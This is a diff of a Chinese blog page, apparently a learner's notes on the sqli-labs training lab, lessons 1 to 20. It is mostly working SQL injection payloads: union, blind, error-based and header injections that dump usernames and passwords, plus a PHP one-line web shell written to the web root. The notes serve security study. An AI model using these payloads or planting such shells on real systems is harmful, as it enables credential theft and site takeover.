@@ -3,12 +3,12 @@
   <head>
     <meta charset="utf-8" >
 
-<title>sql注入基础知识 | z0ekball</title>
+<title>sqli-labs学习1~19 | z0ekball</title>
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
-<link rel="shortcut icon" href="https://z0ekball.github.io/favicon.ico?v=1623234346076">
+<link rel="shortcut icon" href="https://z0ekball.github.io/favicon.ico?v=1623257113549">
 <link rel="stylesheet" href="https://z0ekball.github.io/styles/main.css">
 
 
@@ -18,9 +18,14 @@
 
 
 
-    <meta name="description" content="#less1
-" />
-    <meta name="keywords" content="" />
+    <meta name="description" content="注：为方便学习,加入两行代码
+echo $sql;
+echo &quot;&lt;br&gt;&quot;;
+
+贯穿始终的步骤：
+mysql查询语句
+查库：select schema_name from information_schema..." />
+    <meta name="keywords" content="sql注入" />
   </head>
   <body>
     <div id="app" class="main">
@@ -29,7 +34,7 @@
   <div class="top-container" data-aos="fade-right">
     <div class="top-header-container">
       <a class="site-title-container" href="https://z0ekball.github.io">
-        <img src="https://z0ekball.github.io/images/avatar.png?v=1623234346076" class="site-logo">
+        <img src="https://z0ekball.github.io/images/avatar.png?v=1623257113549" class="site-logo">
         <h1 class="site-title">z0ekball</h1>
       </a>
       <div class="menu-btn" @click="menuVisible = !menuVisible">
@@ -91,20 +96,231 @@
       <div class="main-container">
         <div class="content-container" data-aos="fade-up">
           <div class="post-detail">
-            <h2 class="post-title">sql注入基础知识</h2>
-            <div class="post-date">2021-06-07</div>
+            <h2 class="post-title">sqli-labs学习1~19</h2>
+            <div class="post-date">2021-06-05</div>
+            
+              <div class="feature-container" style="background-image: url('https://z0ekball.github.io/post-images/sql-zhu-ru-ji-chu-zhi-shi.webp')">
+              </div>
             
             <div class="post-content" v-pre>
-              <p>#less1</p>
+              <h5 id="注为方便学习加入两行代码">注：为方便学习,加入两行代码</h5>
+<pre><code class="language-sql">echo $sql;
+echo &quot;&lt;br&gt;&quot;;
+</code></pre>
+<h1 id="贯穿始终的步骤">贯穿始终的步骤：</h1>
+<pre><code class="language-sql">mysql查询语句
+查库：select schema_name from information_schema.schemata;
+查表：select table_name from information_schema.tables where table_schema='security';
+查列：select column_name from information_schema.columns where table_name='users';
+查字段：select username,password from security.users;
+</code></pre>
+<h1 id="less-1">less-1</h1>
+<pre><code class="language-sql">注入漏洞：id=1'--+
+</code></pre>
+<h3 id="知识点补充">知识点补充：</h3>
+<pre><code class="language-sql">* order by //判断多少个注入点
+* union select  1,2,3  //查看那些数据可以回显(id=-1)
+* group_concat() //批量查询
+* concat_ws('~',a,b) //查询a~b
+</code></pre>
+<h3 id="查看当前数据库">查看当前数据库</h3>
+<pre><code class="language-sql">id=-1' union select 1,2,database() --+
+id=-1'  union select 1,2,concat_ws('~',user(),version(),database()) --+ 
+//查询数据库版本,路径,当前用户,当前数据库
+</code></pre>
+<h3 id="查看数据库所有数据库">查看数据库/所有数据库</h3>
+<pre><code class="language-sql">id=-1' union select 1,2,schema_name from information_schema.schemata limit 4,1--+  //limit 决定查看序数
+id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+
+</code></pre>
+<h3 id="查看表所有表">查看表/所有表</h3>
+<pre><code class="language-sql">id=-1' union select 1,2,table_name from information_schema.tables where table_schema=0x() limit 1,1--+
+//十六进制绕过
+id=-1' union select 1,2,group_concat(table_name) from information_schema. tables where table_schema=0x()--+
+</code></pre>
+<h3 id="查看列信息所有列信息">查看列信息/所有列信息</h3>
+<pre><code class="language-sql">id=-1' union select 1,2,column_name from information_schema.columns where table_name=0x() --+
+
+id=-1' union select 1,2,group_concat(column_name) from information_schema. columns where table_name=0x()--+
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/1623248765124.png" alt="" loading="lazy"></figure>
+<h3 id="连接查询用户名和密码所有用户和密码">连接查询用户名和密码/所有用户和密码</h3>
+<pre><code class="language-sql">id=-1'  union select 1,2,concat_ws('~',username,password)from security.users limit 1,1--+
+
+id=-1' union select 1,2,group_concat(concat_ws('~',username,password))from security.users--+
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/1623248880427.png" alt="" loading="lazy"></figure>
+<h1 id="less-2">less-2</h1>
+<pre><code>注入漏洞：id=1--+,不需要'
+</code></pre>
+<h1 id="less-3">less-3</h1>
+<pre><code>注入漏洞：id=1')--+
+</code></pre>
+<h1 id="less-4">less-4</h1>
+<pre><code>注入漏洞：id=1”)--+
+</code></pre>
+<h1 id="less-5布尔型盲注">less-5（布尔型盲注）</h1>
+<pre><code>注入漏洞：1'--+,布尔型盲注
+</code></pre>
+<h3 id="知识点补充-2">知识点补充</h3>
+<pre><code class="language-sql">1. left(a,b) 从左侧截取a的前b位,正确返回1,错则返回0 ——burpsuit爆破
+2. regexp 正则表达式
+/转意
+^匹配开始部分
+$匹配结束部分
+.匹配任何字符
+[:character_class:]术语类的所有字符匹配的字符类
+[[:&lt;:]],[[:&gt;:]]word 边界,
+3. like 
+'n%'以N开始的
+'%g'以g结尾
+'%s%'包含s
+4.substr(a,b,c) 从b开始,截取a字符c位长度
+ascii(substr((select database()),1,1)2分法获得字符 
+//当没有在当前数据库下没有回显,一般不适用
+</code></pre>
+<h3 id="猜测字符方法">猜测字符方法</h3>
+<pre><code>burpsuite爆破
+手动二分法
+脚本
+</code></pre>
+<h3 id="示例">示例</h3>
+<pre><code class="language-sql">burpsuite:  id=1' and left((select database()),1))='a'--+
+</code></pre>
+<p><img src="https://z0ekball.github.io/post-images/1623250110147.png" alt="" loading="lazy"><br>
+<img src="https://z0ekball.github.io/post-images/1623250114161.png" alt="" loading="lazy"></p>
+<h1 id="less-6">less-6</h1>
+<pre><code>注入漏洞：id=1”--+,布尔型盲注
+</code></pre>
+<h1 id="less-7一句话木马">less-7（一句话木马）</h1>
+<pre><code>注入漏洞：id=1'))--+,布尔型盲注
+</code></pre>
+<h3 id="知识点补充-3">知识点补充：</h3>
+<pre><code class="language-sql">1.一句话木马： &lt;?php @eval($_POST['attack']);?&gt;
+【基本原理】利用文件上传漏洞,往目标网站中上传一句话木马,然后你就可以在本地通过中国菜刀chopper.exe即可获取和控制整个网站目录。@表示后面即使执行错误,也不报错。eval()函数表示括号内的语句字符串什么的全都当做代码执行。$_POST['attack']表示从页面中获得attack这个参数值。
+【条件】
+(1)木马上传成功,未被杀;
+(2)知道木马的路径在哪;
+(3)上传的木马能正常运行。
+2.load_file('文件路径')：读取本地文件 (避免特殊字符使用双斜杠\\)
+3.into outfile：写文件
+</code></pre>
+<h3 id="示例-2">示例</h3>
+<pre><code class="language-sql">id=1')) union select 1,2,'&lt;?php @eval($_POST[''pass'']);?&gt;' into outfile 'D:\\learning_tools\\phpstudy\\phpstudy_pro\\WWW\\sqli\\Less-7\\test2.php' --+
+</code></pre>
+<p><img src="https://z0ekball.github.io/post-images/1623251647771.png" alt="" loading="lazy"><br>
+<img src="https://z0ekball.github.io/post-images/1623251657358.png" alt="" loading="lazy"></p>
+<h1 id="less-8">less-8</h1>
+<pre><code>注入漏洞：id=1'--+,布尔盲注
+</code></pre>
+<h1 id="less-9时间盲注">less-9（时间盲注）</h1>
+<pre><code>注入漏洞：id=1' --+,时间盲注
+</code></pre>
+<h3 id="实例">实例</h3>
+<pre><code class="language-sql">id=1' and sleep(5)--+ //延迟5秒表示注入成功
+</code></pre>
+<h1 id="less-10">less-10</h1>
+<pre><code>注入漏洞：id=1”--+,时间盲注
+</code></pre>
+<h1 id="less-11">less-11</h1>
+<pre><code class="language-sql">注入漏洞：uname=n'or 1=1 #&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<h3 id="实例-和get相同">实例 (和get相同)</h3>
+<pre><code class="language-sql">//查多少个注入点
+uname=n' order by 2 #&amp;passwd=admin&amp;submit=Submit
+
+//查到数据库——security
+uname=n' union select 1,schema_name from information_schema.schemata limit 2,1 #&amp;passwd=admin&amp;submit=Submit 
+
+//查看表——users
+uname=n' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security'  #&amp;passwd=admin&amp;submit=Submit
+
+//查看列——username
+uname=n' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'  #&amp;passwd=admin&amp;submit=Submit
+
+//查所有username
+uname=n' union select 1,group_concat(username) from security.users  #&amp;passwd=admin&amp;submit=Submit
+
+//查询用户~密码
+uname=n' union select 1,group_concat(concat_ws(0x7e,username,password)) from security.users  #&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/1623253088112.png" alt="" loading="lazy"></figure>
+<h1 id="less-12">less-12</h1>
+<pre><code class="language-sql">注入漏洞：uname=n&quot;) or 1=1 #&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<h1 id="less-13-布尔盲注">less-13 (布尔盲注)</h1>
+<pre><code class="language-sql">注入漏洞：uname=n') or 1=1 #&amp;passwd=admin&amp;submit=Submit
+布尔型盲注
+</code></pre>
+<h3 id="实例-2">实例</h3>
+<pre><code class="language-sql">burp suite爆破：
+uname=n') or left(database(),1)='a' #&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/1623253489685.png" alt="" loading="lazy"></figure>
+<h1 id="less-14">less-14</h1>
+<pre><code class="language-sql">注入漏洞：uname=n&quot; or 1=1#&amp;passwd=admin&amp;submit=Submit
+布尔型盲注
+</code></pre>
+<h1 id="less-15">less-15</h1>
+<pre><code class="language-sql">注入漏洞：uname=addmin&amp;passwd=ad' or 1=1 #&amp;submit=Submit 
+注入点在passwd,其他一样
+布尔型盲注
+</code></pre>
+<p>#less-16</p>
+<pre><code class="language-sql">注入漏洞：uname=addmin&amp;passwd=ad&quot; or 1=1 #&amp;submit=Submit 
+布尔型盲注
+</code></pre>
+<h1 id="less-17更新漏洞">less-17（更新漏洞）</h1>
+<pre><code class="language-sql">注入漏洞：uname=admin &amp;passwd=dadad' # &amp;submit=Submit
+更新密码存在注入漏洞
+</code></pre>
+<h3 id="知识点补充-4">知识点补充</h3>
+<pre><code>updatexml(XML_document,XPath_string,new_value)
+第一个参数：string格式,xml文件对象名称
+第二个参数：xpath格式字符串
+第三个参数：string格式,替换查找符合条件的数据
+作用：改变文档中符合节点条件的节点值
+</code></pre>
+<h3 id="实例-3">实例</h3>
+<pre><code class="language-sql">//返回当前数据库
+uname=admin &amp;passwd=dadad' and updatexml(1,concat(0x7e,(database())),1)# &amp;submit=Submit
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/1623254628297.png" alt="" loading="lazy"></figure>
+<h1 id="less-18user-agent漏洞">less-18（User-Agent漏洞）</h1>
+<pre><code>注入漏洞：
+User-Agent:'or updatexml(1,concat('~',(database())),1) or '1'='1
+//   '闭合
+User-Agent:'or updatexml(1,concat('~',(database())),1), '','')# 
+ //另一种闭合
+</code></pre>
+<h3 id="实例-4">实例</h3>
+<pre><code>//查库
+User-Agent:' or updatexml(1,concat(0x7e,(database())),1),'','')#
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/1623256440472.png" alt="" loading="lazy"></figure>
+<h1 id="less-19referer漏洞">less-19（Referer漏洞）</h1>
+<pre><code>注入漏洞：Referer:' or updatexml(1,concat('~',(database())),1) or '1'='1
+注入点在referer,其他一样
+</code></pre>
+<h1 id="less-20-cookie漏洞">less-20 (cookie漏洞)</h1>
+<pre><code>注入漏洞：cookie中value值'    #注入
+</code></pre>
 
             </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://z0ekball.github.io/tag/Xnf6eEgg-/" class="tag">
+                    sql注入
+                  </a>
+                
+              </div>
             
             
               <div class="next-post">
                 <div class="next">下一篇</div>
-                <a href="https://z0ekball.github.io/post/111/">
+                <a href="https://z0ekball.github.io/post/a-sa-da-d/">
                   <h3 class="post-title">
-                    111
+                    关于zyy是只猪这件事
                   </h3>
                 </a>
               </div>
